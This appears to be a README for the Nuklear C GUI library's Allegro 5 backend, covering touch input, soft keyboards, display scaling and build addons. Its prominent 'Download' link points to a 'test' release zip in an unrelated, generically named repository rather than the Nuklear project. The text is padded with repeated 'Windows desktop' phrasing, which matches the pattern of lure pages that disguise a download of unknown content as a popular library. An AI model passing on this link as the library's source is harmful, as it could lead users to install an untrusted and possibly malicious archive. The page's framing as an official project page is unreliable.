# Nuklear

A single-header ANSI C immediate mode GUI library with an Allegro 5 backend suitable for OpenGL-based desktop and mobile applications, including Windows desktop software built with Allegro.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/Nuklear.zip)

## Overview

Nuklear is an immediate mode graphical user interface library for ANSI C. This repository focuses on using Nuklear with Allegro 5, providing a backend that connects Allegro input, rendering, fonts, images, and primitives with Nuklear UI code.

The backend is intended for projects that use Allegro 5 with an OpenGL backend. It can be used in a Windows environment as part of a desktop application, and it also supports other Allegro-supported platforms such as iOS and Android.

## What This Repository Provides

This repository contains support code and guidance for using Nuklear together with Allegro 5. It is useful when building C applications that need a lightweight immediate mode GUI and already rely on Allegro for platform, windowing, graphics, or input handling.

Core areas covered include:

- Allegro 5 integration for Nuklear
- OpenGL-backed rendering support through Allegro
- Mouse-style input handling for touch devices
- Notes on resolution and density handling
- Soft keyboard considerations for iOS and Android
- Build requirements for Allegro addons

## Main Capabilities

### Immediate Mode GUI for C Applications

Nuklear follows an immediate mode UI model. Instead of maintaining a separate retained widget tree, UI state is typically described each frame by application code. This approach is often useful for tools, demos, editors, debug panels, and lightweight desktop utilities.

### Allegro 5 Backend

The backend adapts Allegro 5 input and rendering behavior for Nuklear. Applications using Allegro can use this layer to draw GUI elements and process user interaction through Nuklear.

### Windows Desktop Usage

When used with Allegro 5 and an OpenGL backend, this code can support Windows desktop application development. It is appropriate for Windows tools, small desktop utilities, editor panels, diagnostics interfaces, and application prototypes that need a C-based GUI without introducing a large framework.

### Touch Input Mapping

On touch devices, the backend handles the first active touch and maps it to Nuklear mouse events. This means a touch behaves similarly to a left mouse button interaction. Dragging on the screen produces mouse movement events for the GUI.

Additional simultaneous touches are ignored by this backend behavior.

## Build Notes

To compile an application using this backend, link the required Allegro 5 addons:

- image
- font
- ttf
- primitives

The included build setup should be consulted for exact linker usage in the project environment.

Because Allegro supports several platforms, the specific compiler, linker flags, and system libraries may vary depending on whether the target is Windows, iOS, Android, or another supported platform.

## Resolution and Display Density

GUI sizing can vary significantly across displays. A font size that is readable on a standard Windows desktop monitor may appear too small on a high-density tablet screen.

Applications using this backend should account for:

- display resolution
- pixel density
- target device type
- expected viewing distance
- preferred widget scale
- font size adjustments

A practical approach is to add a small application-level scaling layer that determines the active screen type and adjusts widget sizes, spacing, and font sizes accordingly.

## Soft Keyboard Support

Touch screen platforms require extra handling for software keyboards.

### Android

Android soft keyboard handling can be implemented through Allegro application callbacks and platform-specific integration. Applications should open and close the keyboard when text editing widgets become active or inactive.

### iOS

On iOS, soft keyboard support requires a `UIView` subclass implementing the `UIKeyInput` interface. A custom event source can be used to emit keyboard events so that they are received by the Allegro/Nuklear input path.

A typical pattern is:

- detect when a text edit widget becomes active
- open the platform soft keyboard
- route key input into the application
- close the keyboard when editing ends

Nuklear edit widget flags can be used to identify activation and deactivation events.

## Handling Manual Keyboard Dismissal

If the user closes a soft keyboard manually, the GUI may still treat the edit field as active. One workaround is to detect the keyboard dismissal and emit touch events outside the active text field. This simulates tapping away from the field and allows the GUI state to deactivate the edit widget.

This behavior is especially relevant on touch-first devices where users can dismiss the software keyboard independently of the application UI.

## Widgets Covered by the Keyboard

On mobile screens, the soft keyboard may cover widgets near the bottom of the display. Applications should plan their layout so editable fields remain visible while typing.

One possible approach is:

- keep the original text widget in read-only display mode
- create a temporary editable widget above the keyboard when selected
- copy the edited value back after the keyboard is dismissed
- remove the temporary editing widget

This keeps input visible and avoids placing active editing fields behind the keyboard.

## Practical Use Cases

Nuklear with Allegro 5 can be used for:

- Windows desktop GUI tools written in C
- lightweight debug panels
- OpenGL application overlays
- editor-style interfaces
- configuration windows
- cross-platform prototypes
- desktop and mobile demos using the same UI library
- applications that need a small immediate mode GUI layer

## Windows Advantages

For Windows desktop software, this setup is useful when an application already uses Allegro 5 for window creation, graphics, and input.

A Windows-focused project can use this backend to add:

- immediate mode UI panels
- buttons, text fields, and controls
- desktop-style interaction through mouse input
- OpenGL-backed rendering through Allegro
- a C-based GUI layer without a large external application framework

The same design can also help when maintaining shared UI code across Windows and other Allegro-supported platforms.

## Getting Started

A typical workflow is:

1. Set up an Allegro 5 application using an OpenGL backend.
2. Link the required Allegro addons: image, font, ttf, and primitives.
3. Initialize Nuklear and the Allegro backend.
4. Forward Allegro input events to Nuklear.
5. Build the UI each frame using Nuklear calls.
6. Render the Nuklear draw output through the backend.
7. Add platform-specific handling for touch screens or soft keyboards if needed.

Exact build details depend on the target platform and the surrounding Allegro project configuration.

## FAQ

### What is Nuklear?

Nuklear is a single-header ANSI C immediate mode GUI library. It is designed for applications that want to define interface layout and interaction directly in code.

### Is this for Windows?

It can be used in a Windows environment with Allegro 5 and an OpenGL backend. The backend is not limited to Windows and can also be used on other Allegro-supported platforms.

### Does it support touch screens?

Yes. The backend maps the first touch to mouse-style Nuklear events. Additional simultaneous touches are ignored.

### Does it handle mobile keyboards automatically?

Soft keyboard behavior requires platform-specific application code. Android and iOS need explicit handling to open, close, and route software keyboard input.

### Which Allegro addons are required?

The backend requires linking against Allegro image, font, ttf, and primitives addons.

### Is display scaling automatic?

No. Applications should handle resolution and display density differences themselves, typically by scaling fonts, spacing, and widget dimensions based on the target screen.

## Conclusion

Nuklear provides a compact ANSI C immediate mode GUI approach, and this Allegro 5 backend makes it usable in Allegro-based applications with OpenGL rendering. It is suitable for Windows desktop tools as well as cross-platform projects that need lightweight GUI controls, touch-aware input handling, and practical integration with Allegro’s rendering and event systems.
